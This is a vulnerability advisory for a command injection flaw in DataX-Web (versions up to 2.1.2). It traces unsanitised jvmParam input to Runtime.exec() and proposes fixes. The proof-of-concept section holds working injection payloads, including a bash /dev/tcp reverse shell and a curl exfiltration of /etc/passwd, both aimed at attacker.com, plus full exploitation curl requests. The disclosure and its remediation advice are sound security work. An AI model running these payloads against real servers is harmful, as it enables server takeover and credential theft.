# Command Injection Vulnerability in DataX-Web via JVM Parameter

## NAME OF AFFECTED PRODUCT(S)

+ DataX-Web

## AFFECTED AND/OR FIXED VERSION(S)

### Vendor Homepage

+ https://github.com/WeiYe-Jing/datax-web

### Submitter

+ s1ain

### VERSION(S)

+ <= 2.1.2

### Software Link

+ https://github.com/WeiYe-Jing/datax-web

## PROBLEM TYPE

### Vulnerability Type

+ Command Injection

### Root Cause

A command injection vulnerability was found in the DataX-Web application. The root cause is that the application fails to properly validate user-supplied JVM parameters before using them in system command execution. The `jvmParam` field from user input is directly concatenated into command strings without any sanitization or validation, and is then executed via `Runtime.getRuntime().exec()`.

### Impact

This vulnerability allows any authenticated user to:
- Execute arbitrary system commands on the executor server
- Gain complete control of the server
- Access sensitive data including database credentials
- Use the compromised server as a pivot point for lateral movement within the network

## DESCRIPTION

DataX-Web is a distributed data synchronization tool that provides a web-based management interface for DataX tasks. The application allows users to configure JVM parameters for DataX task execution. However, this functionality lacks proper input validation and access control, leading to a critical command injection vulnerability.

## Code Analysis

### Vulnerable Code Flow

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/controller/JobInfoController.java`

```java
@PostMapping("/add")
@ApiOperation("Add Task")
public ReturnT<String> add(HttpServletRequest request, @RequestBody JobInfo jobInfo) {
    jobInfo.setUserId(getCurrentUserId(request));
    return jobService.add(jobInfo);  // No validation on jvmParam
}
```

**File:** `datax-admin/src/main/java/com/wugui/datax/admin/service/impl/JobServiceImpl.java`

```java
@Override
public ReturnT<String> add(JobInfo jobInfo) {
    // ... other validations ...
    // No validation on jvmParam field
    jobInfoMapper.save(jobInfo);
    return new ReturnT<>(String.valueOf(jobInfo.getId()));
}
```

**File:** `datax-executor/src/main/java/com/wugui/datax/executor/util/BuildCommand.java`

```java
private static String buildDataXParam(TriggerParam tgParam) {
    StringBuilder doc = new StringBuilder();
    String jvmParam = StringUtils.isNotBlank(tgParam.getJvmParam()) ?
                     tgParam.getJvmParam().trim() : tgParam.getJvmParam();
    if (StringUtils.isNotBlank(jvmParam)) {
        // Vulnerable: Direct concatenation without validation
        doc.append(JVM_CM).append(TRANSFORM_QUOTES)
           .append(jvmParam).append(TRANSFORM_QUOTES);
    }
    // ...
    return cmdArr.toArray(new String[cmdArr.size()]);
}
```

**File:** `datax-executor/src/main/java/com/wugui/datax/executor/service/jobhandler/ExecutorJobHandler.java`

```java
public ReturnT<String> execute(TriggerParam trigger) throws Exception {
    // ...
    String[] cmdarrayFinal = buildDataXExecutorCmd(trigger, tmpFilePath, dataXPyPath);

    // Vulnerable: Execute command with user-controlled parameter
    final Process process = Runtime.getRuntime().exec(cmdarrayFinal);
    // ...
}
```

### Vulnerability Location

**Affected Component:**
- `datax-executor/src/main/java/com/wugui/datax/executor/util/BuildCommand.java` (line 54-58)
- `datax-executor/src/main/java/com/wugui/datax/executor/service/jobhandler/ExecutorJobHandler.java` (line 55)

**Affected Field:**
- `JobInfo.jvmParam` - User-controllable String field

## Vulnerability Details and POC

### Attack Vector

1. Authenticate to DataX-Web as any user (no admin privileges required)
2. Create a new DataX task via `/api/job/add` endpoint
3. Inject malicious commands in the `jvmParam` field
4. Trigger the task execution
5. Malicious commands execute on the executor server

### Payload

**Basic Command Injection:**
```json
POST /api/job/add HTTP/1.1
Host: target.com
Authorization: Bearer <valid-jwt-token>
Content-Type: application/json

{
  "jobDesc": "Test Task",
  "executorHandler": "executorJobHandler",
  "jobCron": "0 0 0 * * ?",
  "jobGroup": 1,
  "glueType": "BEAN",
  "executorRouteStrategy": "FIRST",
  "executorBlockStrategy": "SERIAL_EXECUTION",
  "jvmParam": "-Xms1G\n&& whoami > /tmp/pwned.txt #",
  "jobJson": "{\"job\":{\"content\":[{\"reader\":{\"name\":\"mysqlreader\"},\"writer\":{\"name\":\"mysqlwriter\"}}]}}"
}
```

**Reverse Shell Payload:**
```json
{
  "jvmParam": "-Xms1G\n&& bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' #"
}
```

**Data Exfiltration Payload:**
```json
{
  "jvmParam": "-Xms1G\n&& curl -X POST -d @/etc/passwd http://attacker.com/exfil #"
}
```

### Exploitation Steps

1. **Setup listener on attacker machine:**
```bash
nc -lvnp 4444
```

2. **Send malicious task creation request:**
```bash
curl -X POST http://target.com/api/job/add \
  -H "Authorization: Bearer eyJhbGc..." \
  -H "Content-Type: application/json" \
  -d '{
    "jobDesc": "Malicious Task",
    "executorHandler": "executorJobHandler",
    "jobCron": "0 0 0 * * ?",
    "jobGroup": 1,
    "glueType": "BEAN",
    "executorRouteStrategy": "FIRST",
    "executorBlockStrategy": "SERIAL_EXECUTION",
    "jvmParam": "-Xms1G\n&& bash -c '\''bash -i >& /dev/tcp/attacker.com/4444 0>&1'\'' #",
    "jobJson": "{\"job\":{\"content\":[{\"reader\":{\"name\":\"mysqlreader\"},\"writer\":{\"name\":\"mysqlwriter\"}}]}}"
  }'
```

3. **Trigger task execution:**
```bash
curl -X POST http://target.com/api/job/trigger \
  -H "Authorization: Bearer eyJhbGc..." \
  -H "Content-Type: application/json" \
  -d '{"jobId": 123}'
```

4. **Receive reverse shell connection**

## Attack Results

### Successful Exploitation Indicators

1. **File Creation Verification:**
   - Command: `jvmParam": "-Xms1G\n&& whoami > /tmp/pwned.txt #"`
   - Result: File `/tmp/pwned.txt` created containing executor process username

2. **Reverse Shell:**
   - Connection established to attacker's machine
   - Full interactive shell with executor process privileges
   - Ability to execute arbitrary commands

3. **Impact:**
   - Complete server compromise
   - Access to application configuration files containing database credentials
   - Potential for lateral movement to database servers and other internal systems

### Security Bypass Analysis

**Why Standard Protections Don't Apply:**

1. **No Input Validation:** The application performs no validation on the `jvmParam` field
2. **No Access Control:** Any authenticated user can set JVM parameters (no admin check)
3. **Direct Execution:** User input directly flows to `Runtime.exec()`
4. **No Sandboxing:** Commands execute with full executor process privileges

## Suggested Repair

### 1. Implement Strict Input Validation (Critical)

```java
private static String validateJvmParam(String jvmParam) {
    if (StringUtils.isBlank(jvmParam)) {
        return "";
    }

    // Whitelist: Only allow standard JVM parameter format
    if (!jvmParam.matches("^(-[DX][a-zA-Z0-9._=]+\\s*)+$")) {
        throw new IllegalArgumentException("Invalid JVM parameter format");
    }

    // Blacklist: Forbidden characters
    String[] dangerousChars = {";", "|", "&", "$", "`", "\n", "\r", "(", ")", ">", "<"};
    for (String dangerous : dangerousChars) {
        if (jvmParam.contains(dangerous)) {
            throw new IllegalArgumentException("JVM parameter contains forbidden characters");
        }
    }

    return jvmParam.trim();
}
```

### 2. Restrict to Admin Users Only (Critical)

```java
@PreAuthorize("hasRole('ROLE_ADMIN')")
@PostMapping("/add")
@ApiOperation("Add Task")
public ReturnT<String> add(HttpServletRequest request, @RequestBody JobInfo jobInfo) {
    jobInfo.setUserId(getCurrentUserId(request));
    return jobService.add(jobInfo);
}
```

### 3. Use ProcessBuilder with Separated Arguments (Recommended)

```java
ProcessBuilder processBuilder = new ProcessBuilder();
processBuilder.command(cmdarray);  // Arguments are properly separated
Process process = processBuilder.start();
```

### 4. Add Audit Logging (Recommended)

```java
@Override
public ReturnT<String> add(JobInfo jobInfo) {
    if (StringUtils.isNotBlank(jobInfo.getJvmParam())) {
        auditLogger.warn("User {} is setting JVM parameter: {}",
                        getCurrentUsername(), jobInfo.getJvmParam());
    }
    // ...
}
```

### 5. Security Configuration Best Practices

1. Limit JVM parameter functionality to administrators only
2. Provide predefined JVM parameter templates instead of free-form input
3. Implement comprehensive audit logging for all task creation/modification
4. Use least-privilege principles for executor process execution
5. Consider container isolation for task execution

## Timeline

- **Discovery Date:** 2025-11-02
- **Vendor Notification:** TBD
- **Public Disclosure:** TBD

## References

- DataX-Web Repository: https://github.com/WeiYe-Jing/datax-web
- Similar CVE: CVE-2023-7116 (killJob command injection in DataX-Web)
- Similar CVE: CVE-2024-12358 (glueSource command injection in DataX-Web)

## Credits

- Discovered by: s1ain
- Analysis Date: 2025-11-02
